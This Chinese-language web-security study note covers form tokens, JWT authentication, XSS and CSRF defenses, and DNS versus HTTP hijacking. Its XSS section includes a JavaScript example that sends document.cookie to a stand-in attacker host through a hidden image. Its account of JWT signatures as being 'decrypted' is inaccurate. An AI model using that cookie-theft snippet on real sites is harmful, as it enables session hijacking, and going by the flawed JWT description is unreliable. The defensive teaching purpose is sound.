## token技术的功能及实现
1. 功能
    - 防止表单重复提交
    - 用来作身份验证
2. 防止表单重复提交的实现
    - 用户第一次请求表单页面，服务器生成token，并放在session中存放，将token发送给客户端
    ```
    //生成token
    UUID token = UUID.randomUUID();
    //放入session中
    request.getSeeion().setAttribute("token",token.toString())
    //放入request传到前台
    request.setAttribute("token",token)
    ```
    - 当用户第一次提交表单，将token一起发送给服务器，与后台的session中的token对比，对比成功，删除session中的token，防止表单重复提交
    ```
    //获取session中的token
    Object token1 = request.getSession().getAttribute("token");
    //获取客户端的token
    String token = request.getParameter("token");
    if(token1 == null){
        System.out.print("提交出错");
    }else if(!token1.equals(token)){
        System.out.print("提交出错");
    }else{
        System.out.print("提交成功");
        //删除session，防止重复提交
        request.getSession().removeAttribute("token");
    }
    ```
3. 基于token的身份验证
    - 客户端使用用户名跟密码请求登陆
    - 服务器端收到请求，去验证用户名和密码成功后，服务器端会签发一个token，再把这个token发送给客户端
    - 客户端收到token存储（cookie或者localStorage），然后每次请求带着token，服务端进行验证
4. token（JWT java web token）相对于cookie和session验证机制的区别：
    - cookie和session机制需要将信息保存在服务端，例如在数据库中，作为数据持久化，每次请求的验证，都需要从数据库获取对比验证  
    - token是基于签名，也可以叫加密，由header.payload.signature组成，token有服务器端生成，payload存放
    json数据，signature是加密，每次服务器的验证，只需要对signature解密，看看解密结果是否与payload相同，就不需要在数据库额外存储数据了，
    换句话说，服务器自己签名的东西，只有自己认识，只是认识的方式不一样了，或者说验证方式不一样了
## XSS和CSRF防御
- XSS跨站脚本（cross-site scripting）和CSRF跨站请求伪造（cross-site request forgery）都属于跨站攻击，XSS是实现CSRF诸多途径中的一条，但不是唯一一条；XSS的本质是让对方浏览器执行
你插入的js，来获取cookie等信息；而CSRF是借用户的身份，向服务器发送请求
XSS分为存储型和反射型：
    - 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方加入代码，如果没有过滤或者
    过滤不严，那么这些代码将存储到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成
    蠕虫，盗窃cookie等
    - 反射型XSS，非持久化，需要欺骗用户自己去点击连接才能触发XSS代码执行。这种XSS代码出现在url中，作为输入
    提交到服务器，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS
- XSS防范
    - 客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码
    中，使得js得以执行
        - 移除用户上传的DOM属性，如onerror等
        - 移除用户上传的style节点，script节点，iframe节点等
    - 对用户输入的代码标签进行转换（html encode）
    - 对url中的参数过滤
    - 对动态输出到页面的内容进行html编码
    - 服务端对敏感的cookie设置httpOnly属性，使js脚本不能读取到cookie
    - CSP即是Content security policy
    ```
    var img = document.createElement('img')
    img.src = 'http://www.xss.com?cookie=' + document.cookie
    img.style.display = 'none'
    document.getElementByTagName('body')[0].appendChild(img)
    //这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意网站，我的恶意站点通过获取get参数就拿到了用户的cookie
    ```
    目前很多浏览器都会自身对用户的输入进行判断，检测是否存在字符攻击，比如script标签，这段代码很明显是一段xss攻击，
    因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将它拦截关闭
- 跨站请求伪造的过程与防范
过程：用户小明在你的网站A上面登录了，A返回了一个SessionID（使用cookie存储），小明的浏览器保持着A站的登录状态，攻击
者小强给小明发送了一个链接地址，小明打开地址的时候，这个页面已经自动的对网站a发送一个请求，通过使用小明的cookie信息，
这样攻击者小强就可以随意更改小明在A上的信息
    - 使用token：服务器随机产生token为密钥生产一段密文，把token和密文都随cookie交给前端，前段发起请求时把密文和
    token交给后端，后端对token和密文进行验证，看token能不能生成同样的密文，这样即使黑客拿到了token也无法拿到密文
    ```
    http://www.weibo.cn?follow_uid=123&token=73ksdkfu102
    ```
    - 使用验证码：每一个重要的post提交页面，使用一个验证码，因为第三放网站无法获取验证码
    - 检测http的头信息refer。refered记录了请求的来源地址，服务器要做的验证是这个来源地址是否合法
    - 涉及敏感操作的请求改为post请求

## http劫持与dns劫持
1. 区别
    - dns劫持：你输入的网址是google.com,出来的是百度的页面；通过某些手段取得域名的解析记录控制权，进而修改
    此域名的解析结果，导致对该域名的访问由原ip地址转入到修改后的指定ip，其结果是特定网址无法访问，访问的是
    假网址
    - http劫持：你打开知乎的页面，右下角弹出的唐老师的不孕不育广告；在使用者与其目的网络服务所建立的专用数
    据通道中，监视特定数据信息，提示当满足特定条件时，就会在正常的数据流中插入精心设计的网络数据报文，目的
    是让用户端程序解释“错误”的数据，并以弹出新窗口的形式在使用者界面展示广告等类容
2. 解决办法
    - 使用https：SSL到TLS协议
    - 加密算法